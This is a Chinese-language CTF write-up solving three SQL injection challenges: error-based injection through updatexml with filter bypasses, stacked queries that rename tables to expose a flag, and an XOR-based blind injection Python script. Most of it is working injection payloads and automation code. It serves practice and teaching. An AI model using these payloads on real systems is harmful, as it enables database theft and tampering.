[极客大挑战 2019]HardSQL

![image-20210812161326718](https://www.hualigs.cn/image/6115333b46cf5.jpg)

登录界面尝试注入，发现是单引号字符型注入，且对union和空格进行过滤，不能用联合注入，但是有错误信息回显，说明可以使用报错注入。

```
username=admin'or(updatexml(1,concat('~',(select(database())),'~'),1))#&password=123
```

利用updatexml函数的报错原理进行注入在路径处利用concat函数拼接~和我们的注入语句

<img src="https://www.hualigs.cn/image/61153338b3112.jpg" alt="image-20210812161844858" style="zoom:80%;" />

发现xpath错误并执行sql语句将错误返回。

等号也被过滤，用like代替等号。

```
username=admin'or(updatexml(1,concat('~',(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),'~'),1))#&password=123
```

![image-20210812162950037](https://www.hualigs.cn/image/6115333609ca8.jpg)

爆字段

```
username=admin'or(updatexml(1,concat('~',(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),'~'),1))#&password=123
```

![image-20210812163124619](https://www.hualigs.cn/image/61153336b0409.jpg)

爆数据

```
username=admin'or(updatexml(1,concat('~',(select(password)from(H4rDsq1)),'~'),1))#&password=123
```

![image-20210812163343223](https://www.hualigs.cn/image/61153336444da.jpg)

这里flag不完整，因为updatexml能查询字符串的最大长度为32，所以这里要用right函数进行读取

```
username=admin'or(updatexml(1,concat('~',(select(right(password,25)from(H4rDsq1)),'~'),1))#&password=123
```

![image-20210812163800151](https://www.hualigs.cn/image/611533367b0ae.jpg)



[强网杯 2019\]随便注

判断完注入类型后尝试联合注入，发现select被过滤，且正则不区分大小写过滤。

![image-20210812181819109](C:\Users\ysvjf\AppData\Roaming\Typora\typora-user-images\image-20210812181819109.png)

那么就用堆叠注入，使用show就可以不用select了。

<img src="https://www.hualigs.cn/image/61153336dd856.jpg" alt="image-20210812182108228" style="zoom: 50%;" />

接下去获取表信息和字段信息

```
1';show tables;#
```

<img src="https://www.hualigs.cn/image/611533301d2fb.jpg" alt="image-20210812182108228" style="zoom: 50%;" />

那一串数字十分可疑大概率flag就在里面，查看一下

```
1';show columns from `1919810931114514`;#
```

这里的表名要加上反单引号，是数据库的引用符。

![image-20210812182714535](https://www.hualigs.cn/image/6115332dbb0d5.jpg)

发现flag，但是没办法直接读取。再读取words，发现里面有个id字段，猜测数据库语句为

```
select * from words where id = '';
```

结合1'or 1=1#可以读取全部数据可以利用改名的方法把修改1919810931114514为words，flag修改为id，就可以把flag读取了。

最终payload：

```
1';
alter table words rename to words1;
alter table `1919810931114514` rename to words;
alter table words change flag(被修改的字段) id(修改成的字段名) varchar(50);
#
```

<img src="https://www.hualigs.cn/image/61153330235ae.jpg" alt="image-20210812183841779" style="zoom:67%;" />

### 

[极客大挑战 2019]FinalSQL

五个选项在点击后都会在url处出现?id。

且union，and，or都被过滤

测试发现?id=1^1会报错

![image-20210812195625232](https://www.hualigs.cn/image/6115333810dca.jpg)

但是?id=1^0会返回?id=1的页面，这就是前面说的原理，当1^0时是等于1的所以返回?id=1的页面。

![image-20210812195820578](https://www.hualigs.cn/image/61153335e585c.jpg)

根据原理写出payload

据此可以写出基于异或的布尔盲注脚本

```python
import requests
flag = ''
for i in range(1,300):
    low = 32
    high = 128
    mid = (low+high)//2
    while(low<high):
        #payload = 'http://f208e4eb-e9b2-4542-87f2-9348eb856e64.node4.buuoj.cn:81/search.php?id=1^(ascii(substr(database(),%d,1))>%d)' %(i,mid)

        r = requests.get(url=payload)

        if 'ERROR' in r.text:
            low = mid+1
        else:
            high = mid
        mid = (low+high)//2
    if(mid<33 or mid>127):
        break
    flag = flag+chr(mid)
    print(flag)

```



